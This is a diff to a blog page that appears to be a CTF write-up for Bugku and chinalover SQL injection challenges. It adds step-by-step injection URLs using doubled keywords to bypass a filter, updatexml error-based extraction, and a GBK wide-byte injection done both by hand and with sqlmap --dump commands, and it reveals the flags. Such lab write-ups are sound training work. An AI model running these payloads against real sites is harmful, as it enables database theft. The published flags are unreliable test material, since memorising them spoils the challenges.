@@ -19,8 +19,9 @@
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd3.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd4.png">
 <meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/cjd5.png">
+<meta property="og:image" content="https://sunzhengyu99.github.io/2020/08/08/Bugku/k1.png">
 <meta property="article:published_time" content="2020-08-08T14:40:51.000Z">
-<meta property="article:modified_time" content="2020-08-08T15:17:48.992Z">
+<meta property="article:modified_time" content="2020-08-09T03:52:58.889Z">
 <meta property="article:author" content="sunzy">
 <meta property="article:tag" content="by sunzy">
 <meta name="twitter:card" content="summary">
@@ -230,6 +231,38 @@ s155964671a
 s214587387a
 
 s214587387a</code></pre><hr>
+<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>爆数据库名</p>
+<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
+<p>database:<strong>web1002-1</strong></p>
+<p>爆表名</p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre><p>flag1,hint</p>
+<p>爆字段名</p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre><p>flag1,address<br>获取内容</p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre><p><strong>usOwycTju+FTUUzXosjr</strong></p>
+<p>提交发现不对</p>
+<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre><p>获取address中的内容</p>
+<p>./Once_More.php<br>下一关地址<br>得到另外一个地址</p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre><p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre><p>Unknown column ‘flag2’ in ‘where clause’</p>
+<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre><p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
+<p><strong>！！！注意把flag改为小写字母</strong></p>
+<hr>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
+<h3 id="一、手工注入"><a href="#一、手工注入" class="headerlink" title="一、手工注入"></a>一、手工注入</h3><p>第一步</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre><p>加单引号报错</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre><p>查看所有的表</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre><p>查看表中的列</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
+ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
+<p>获取字段内容</p>
+<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
+<h3 id="二、sqlmap注入"><a href="#二、sqlmap注入" class="headerlink" title="二、sqlmap注入"></a>二、sqlmap注入</h3><p>检测是否有注入点</p>
+<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>没有成功<br>使用十六进制</p>
+<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre><p>获取数据库名</p>
+<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
+ --dbs //选择十六进制 获取数据库名 单引号使用url编码</code></pre><p>获取表名</p>
+<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre><p>获取flag</p>
+<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre><p><img src="/2020/08/08/Bugku/k1.png" alt></p>
 
       
 
